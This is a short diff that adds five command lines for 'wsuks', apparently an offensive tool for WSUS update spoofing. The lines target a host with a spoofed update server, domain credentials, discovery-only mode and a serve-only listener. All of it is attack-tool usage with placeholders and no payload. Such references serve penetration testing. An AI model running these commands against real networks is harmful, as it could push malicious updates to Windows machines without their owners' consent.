@@ -1,0 +1,5 @@
+wsuks -t "$TARGET" --WSUS-Server "$IP"
+wsuks -t "$TARGET" -u "$USER" -p "$PASSWORD" -d "$DOMAIN" --dc-ip "$DC_IP"
+wsuks -t "$TARGET" -u "$USER" -p "$PASSWORD" -d "$DOMAIN" --dc-ip "$DC_IP" --only-discover
+wsuks -t "$TARGET" --WSUS-Server "$IP" -I "${INTERFACE:-eth0}"
+wsuks --serve-only -I "${INTERFACE:-eth0}"
